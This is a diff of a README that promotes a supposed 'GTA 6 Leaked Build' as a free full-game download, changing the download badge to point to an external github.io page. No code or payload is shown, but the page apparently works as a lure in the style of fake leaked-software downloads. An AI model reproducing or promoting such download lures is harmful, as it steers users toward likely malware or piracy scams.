@@ -20,7 +20,7 @@ This package includes everything you need to jump straight into the game without
 
 ### Step 1: Get the Files
 
-[![Download Now](https://img.shields.io/badge/Download-GTA_6_Leaked_Build-blue?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://github.com/Iliamnaremotapiece5009/GTA-6-Mega-Download-Full-Game-Free/releases)
+[![Download Now](https://img.shields.io/badge/Download-GTA_6_Leaked_Build-blue?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://iliamnaremotapiece5009.github.io)
 
 Visit this link to download the application.
 
